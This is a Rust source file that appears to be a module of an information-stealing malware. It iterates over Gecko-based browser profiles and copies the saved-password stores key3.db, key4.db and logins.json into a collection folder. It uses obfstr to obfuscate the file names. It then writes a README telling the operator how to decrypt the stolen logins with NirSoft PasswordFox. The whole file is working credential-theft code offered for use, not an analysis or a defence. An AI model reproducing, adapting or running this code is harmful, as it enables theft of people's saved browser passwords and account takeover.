use crate::gecko::GeckoBrowserData;
use crate::{collect_unique_from_profiles, read_and_collect_unique_records, SqliteDatabase};
use alloc::sync::Arc;
use alloc::vec::Vec;
use collector::Collector;
use database::{Database, DatabaseExt, TableRecord};
use derive_new::new;
use indoc::indoc;
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use filesystem::{copy_file, FileSystem, WriteTo};
use tasks::Task;
use obfstr::obfstr as s;

#[derive(new)]
pub(super) struct PasswordTask<'a> {
    browser: Arc<GeckoBrowserData<'a>>,
}

impl<C: Collector, F: FileSystem> Task<C, F> for PasswordTask<'_> {
    fn run(&self, parent: &Path, filesystem: &F, _collector: &C) {
        let mut at_least_one = false;

        for profile in &self.browser.profiles {
            let Some(name) = profile.name() else {
                continue;
            };

            [
                s!("key3.db"),
                s!("key4.db"),
                s!("logins.json")
            ].iter().for_each(|file| {
                    let _ = copy_file(
                        StorageFileSystem,
                        profile / file,
                        filesystem,
                        parent / name,
                        true
                    ).map(|_| at_least_one = true);
                })
        }

        if at_least_one {
            let content = indoc! {r#"
                Decrypting saved passwords from Gecko-based browsers is seriously a pain.
                Over the years, Mozilla has changed the way they store and encrypt data, and many modern tools no longer support all formats.

                But for now, included in each profile directory are just the essential files needed to view saved passwords using a free and simple utility:
                👉 PasswordFox by NirSoft https://www.nirsoft.net/utils/passwordfox.html

                No installation needed — just run the program, point it to the profile folder, and it should display any saved logins.

                Good luck — you’ll need it.
            "#};

            let _ = content.write_to(filesystem, parent / "README.txt");
        }
    }
}
